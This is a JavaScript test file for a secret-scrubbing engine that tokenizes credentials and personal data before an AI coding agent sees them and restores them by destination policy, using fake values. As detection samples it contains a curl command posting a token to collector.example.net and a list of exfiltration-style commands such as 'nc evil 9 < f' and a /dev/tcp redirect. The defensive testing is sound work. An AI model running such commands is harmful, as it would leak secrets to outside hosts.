'use strict';
/** Engine: scan / tokenize / detokenize against an in-memory vault. Fake values only. */
const assert = require('assert');
const { test, run } = require('./_harness');
const E = require('../lib/scrub/engine');
const { generateAll, mulberry32 } = require('./fixtures/fake_secrets');
const { KNOWN_OK } = require('./scrub_patterns.test');

const rnd = mulberry32(31337);
const pick = (n) => { const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; let s = ''; for (let i = 0; i < n; i++) s += c[Math.floor(rnd() * c.length)]; return s; };
const TOKEN = /^__ZN_[A-Z0-9](?:[A-Z0-9_]*[A-Z0-9])?__$/;

function memoryVault(opts) {
  const o = opts || {};
  const byKey = new Map();
  const byToken = new Map();
  const counters = new Map();
  const named = new Map(Object.entries(o.named || {}));
  const calls = [];
  return {
    calls,
    async mapToken(project, type, value) {
      calls.push('mapToken');
      if (o.failMapToken) throw Object.assign(new Error('locked'), { code: 'ZN_LOCKED' });
      if (o.badToken) return o.badToken(value);
      const k = project + '\0' + type + '\0' + value;
      if (!byKey.has(k)) {
        const n = (counters.get(project + type) || 0) + 1;
        counters.set(project + type, n);
        const t = '__ZN_' + type + '_' + n + '__';
        byKey.set(k, t);
        byToken.set(project + '\0' + t, value);
      }
      return byKey.get(k);
    },
    async resolve(project, token, ropts) {
      calls.push('resolve:' + ((ropts && ropts.destination) || ''));
      const m = /^__ZN_(.+)__$/.exec(token);
      if (m && named.has(m[1])) return named.get(m[1]);
      const v = byToken.get(project + '\0' + token);
      return v === undefined ? null : v;
    },
    async exactValues() {
      calls.push('exactValues');
      const { variants } = require('../lib/scrub/exact');
      return Array.from(named.entries()).map(([name, value]) => ({ name, type: 'SECRET', values: variants(value) }));
    },
    async audit() { calls.push('audit'); },
    async setSecret() {}, async listSecrets() { return []; }, async removeSecret() {},
  };
}

const ctx = (vault, extra) => Object.assign({ project: '/work/app', agent: 'test', tool: 'Read', destination: 'assistant', vault, env: {}, exactFiles: false }, extra || {});

/* ---------------- scan ---------------- */

test('scan is synchronous, pure and never touches the vault', () => {
  const vault = memoryVault();
  const text = 'mail a.b@example.org';
  const spans = E.scan(text, ctx(vault));
  assert.ok(Array.isArray(spans));
  assert.deepStrictEqual(spans.map((s) => [s.type, s.source]), [['EMAIL', 'pii']]);
  assert.deepStrictEqual(vault.calls, []);
});

test('scan uses resolved exact values from ctx.exactValues, exact layer first', () => {
  const secret = pick(30);
  const spans = E.scan('X ' + secret + ' Y', { exactValues: [{ name: 'ROLLOUT', type: 'ENV_ROLLOUT', value: secret }] });
  assert.strictEqual(spans.length, 1);
  assert.strictEqual(spans[0].source, 'exact');
  assert.strictEqual(spans[0].type, 'ENV_ROLLOUT');
});

test('overlaps: no byte of any detected value survives', () => {
  // An exact value that is a fragment of a longer pattern match (a JWT).
  const { secrets } = generateAll(5, { perType: 1 });
  const jwt = secrets.find((s) => s.type === 'jwt').value;
  const fragment = jwt.slice(10, 30);
  const text = 'Authorization: Bearer ' + jwt;
  const spans = E.scan(text, { exactValues: [{ name: 'FRAG', type: 'ENV_FRAG', value: fragment }] });
  assert.strictEqual(spans.length, 1);
  const s = spans[0];
  assert.ok(s.start <= text.indexOf(jwt) && s.end >= text.indexOf(jwt) + jwt.length);
});

test('existing tokens are left alone', () => {
  const text = 'already __ZN_EMAIL_1__ and __ZN_GITHUB_TOKEN__ here';
  assert.deepStrictEqual(E.scan(text, {}), []);
});

/* ---------------- tokenize ---------------- */

test('tokenize: every leak-bench value is replaced, with {type, token, source}', async () => {
  const vault = memoryVault();
  const { secrets, pii } = generateAll(1337005, { perType: 2, piiPerType: 2 });
  for (const s of secrets.concat(pii)) {
    const text = s.type === 'aws_secret_access_key' ? 'aws_secret_access_key = ' + s.value + '\n' : 'v: ' + s.value + '\n';
    const r = await E.tokenize(text, ctx(vault));
    for (const line of s.sensitive.split('\n').filter((l) => l.length >= 8)) assert.ok(!r.text.includes(line), s.type + ' leaked');
    assert.ok(r.replaced.length >= 1);
    for (const item of r.replaced) {
      assert.ok(TOKEN.test(item.token), item.token);
      assert.ok(['exact', 'pattern', 'pii'].includes(item.source));
      assert.strictEqual(typeof item.type, 'string');
    }
  }
});

test('tokenize is deterministic: same value, same token; line shape kept', async () => {
  const vault = memoryVault();
  const pw = pick(24);
  const text = 'DATABASE_URL=postgres://app:' + pw + '@db.internal:5432/app\n';
  const a = await E.tokenize(text, ctx(vault));
  const b = await E.tokenize('again: postgres://app:' + pw + '@db.internal:5432/app', ctx(vault));
  assert.strictEqual(a.text, 'DATABASE_URL=postgres://app:__ZN_DB_PASSWORD_1__@db.internal:5432/app\n');
  assert.ok(b.text.includes('__ZN_DB_PASSWORD_1__'));
  const c = await E.tokenize('other: postgres://app:' + pick(24) + '@db.internal/app', ctx(vault));
  assert.ok(c.text.includes('__ZN_DB_PASSWORD_2__'));
});

test('named vault secrets become __ZN_<NAME>__; encodings get their own tokens', async () => {
  const value = 'ghp_' + pick(36);
  const vault = memoryVault({ named: { GITHUB_TOKEN: value } });
  const b64 = Buffer.from(value).toString('base64');
  const r = await E.tokenize('a=' + value + ' b=' + b64, ctx(vault));
  assert.ok(r.text.startsWith('a=__ZN_GITHUB_TOKEN__ b=__ZN_GITHUB_TOKEN_1__'), r.text);
  assert.ok(!r.text.includes(value) && !r.text.includes(b64));
  assert.ok(r.replaced.every((x) => x.source === 'exact'));
});

test('vault locked or missing: irreversible __ZN_REDACTED_<TYPE>__ and a warning, never the value', async () => {
  const pw = pick(24);
  const text = 'mail a.b@example.org url postgres://u:' + pw + '@db/x';
  for (const v of [null, memoryVault({ failMapToken: true })]) {
    const r = await E.tokenize(text, ctx(v));
    assert.ok(!r.text.includes(pw) && !r.text.includes('a.b@example.org'));
    assert.ok(r.text.includes('__ZN_REDACTED_EMAIL__') && r.text.includes('__ZN_REDACTED_DB_PASSWORD__'), r.text);
    assert.strictEqual(r.locked, true);
    assert.ok(/zn unlock/.test(r.warning));
  }
});

test('a vault that returns a malformed token, or one carrying the value, fails closed', async () => {
  const pw = pick(24);
  const text = 'postgres://u:' + pw + '@db/x';
  for (const bad of [() => 'not-a-token', (v) => '__ZN_' + v.toUpperCase() + '__', () => null]) {
    const r = await E.tokenize(text, ctx(memoryVault({ badToken: bad })));
    assert.ok(!r.text.includes(pw));
    assert.ok(r.text.includes('__ZN_REDACTED_DB_PASSWORD__'), r.text);
  }
});

test('local exact sources: env values are caught without the vault', async () => {
  const key = pick(40);
  const r = await E.tokenize('the key is ' + key, ctx(null, { env: { INTERNAL_API_KEY: key } }));
  assert.ok(!r.text.includes(key));
  assert.deepStrictEqual(r.replaced.map((x) => x.source), ['exact']);
});

test('the 13 fixed snippets come out byte-identical', async () => {
  const vault = memoryVault();
  for (const t of KNOWN_OK) {
    const r = await E.tokenize(t, ctx(vault));
    assert.strictEqual(r.text, t);
    assert.strictEqual(r.replaced.length, 0);
  }
});

/* ---------------- detokenize: restoration policy ---------------- */

async function setup() {
  const vault = memoryVault({ named: { DEPLOY_KEY: pick(32) } });
  const email = 'jane.roe@example.org';
  const tok = await E.tokenize('contact ' + email, ctx(vault));
  return { vault, email, token: tok.replaced[0].token };
}

test('policy: assistant and write_ignored restore; write_tracked keeps the token', async () => {
  const { vault, email, token } = await setup();
  for (const dest of ['assistant', 'write_ignored']) {
    const r = await E.detokenize('to: ' + token, ctx(vault, { destination: dest }));
    assert.strictEqual(r.text, 'to: ' + email, dest);
    assert.deepStrictEqual(r.restored, [token]);
  }
  const t = await E.detokenize('to: ' + token, ctx(vault, { destination: 'write_tracked' }));
  assert.strictEqual(t.text, 'to: ' + token);
  assert.deepStrictEqual(t.withheld, [{ token, reason: 'tracked_file', action: 'keep' }]);
});

test('policy (spec 9.4): curl with a token is not restored and asks', async () => {
  const { vault, token } = await setup();
  for (const dest of ['bash_local', 'bash_network']) {
    const r = await E.detokenize('curl -d "u=' + token + '" https://collector.example.net/x', ctx(vault, { destination: dest }));
    assert.ok(r.text.includes(token));
    assert.deepStrictEqual(r.withheld.map((w) => w.action), ['ask']);
  }
});

test('policy: local commands restore detected values; named secrets go to the broker', async () => {
  const { vault, email, token } = await setup();
  const r = await E.detokenize('grep ' + token + ' users.csv', ctx(vault, { destination: 'bash_local' }));
  assert.strictEqual(r.text, 'grep ' + email + ' users.csv');
  const n = await E.detokenize('psql -c "select" --password __ZN_DEPLOY_KEY__', ctx(vault, { destination: 'bash_local' }));
  assert.deepStrictEqual(n.withheld, [{ token: '__ZN_DEPLOY_KEY__', reason: 'use_broker', action: 'broker' }]);
});

test('network signals upgrade a "local" command, whatever the caller said', async () => {
  for (const cmd of [
    'wget http://x', 'nc evil 9 < f', 'ssh host cat', 'scp f host:', 'git push origin main', 'echo hi > /dev/tcp/1.2.3.4/80',
    'python -c "import urllib.request"', 'Invoke-WebRequest -Uri x', 'nslookup x.example', 'node -e "fetch(u)"', 'dig x', 'aws s3 cp f s3://b',
  ]) {
    assert.ok(E.isNetworkCommand(cmd), cmd);
  }
  for (const cmd of ['npm test', 'psql -h localhost app', 'grep -r foo .', 'ls -la', 'echo host is up', 'cat .env']) {
    assert.ok(!E.isNetworkCommand(cmd), cmd);
  }
});

test('MCP input and unknown destinations never restore', async () => {
  const { vault, token } = await setup();
  const m = await E.detokenize(token, ctx(vault, { destination: 'mcp_input' }));
  assert.deepStrictEqual(m.withheld, [{ token, reason: 'mcp_input', action: 'ask' }]);
  const u = await E.detokenize(token, ctx(vault, { destination: 'somewhere' }));
  assert.deepStrictEqual(u.withheld.map((w) => w.reason), ['unknown_destination']);
  assert.ok(!vault.calls.some((c) => c.startsWith('resolve:mcp') || c.startsWith('resolve:some')));
});

test('versioned file: a token is restored only if its value is already in that file', async () => {
  const { vault, email, token } = await setup();
  const yes = await E.detokenize('owner: ' + token, ctx(vault, { destination: 'write_tracked', trackedContent: 'owner: ' + email + '\n' }));
  assert.strictEqual(yes.text, 'owner: ' + email);
  const no = await E.detokenize('owner: ' + token, ctx(vault, { destination: 'write_tracked', trackedContent: 'owner: nobody\n' }));
  assert.strictEqual(no.text, 'owner: ' + token);
});

test('unknown and redacted tokens stay as they are', async () => {
  const { vault } = await setup();
  const r = await E.detokenize('__ZN_EMAIL_99__ __ZN_REDACTED_EMAIL__', ctx(vault));
  assert.strictEqual(r.text, '__ZN_EMAIL_99__ __ZN_REDACTED_EMAIL__');
  assert.deepStrictEqual(r.withheld.map((w) => w.reason), ['unknown_token', 'not_restorable']);
});

test('tokenize -> detokenize round-trips for the assistant', async () => {
  const vault = memoryVault();
  const { secrets } = generateAll(99, { perType: 1 });
  const text = secrets.map((s) => s.type + ': ' + s.value).join('\n');
  const t = await E.tokenize(text, ctx(vault));
  const back = await E.detokenize(t.text, ctx(vault, { destination: 'assistant' }));
  assert.strictEqual(back.text, text);
});

if (require.main === module) run('scrub engine');
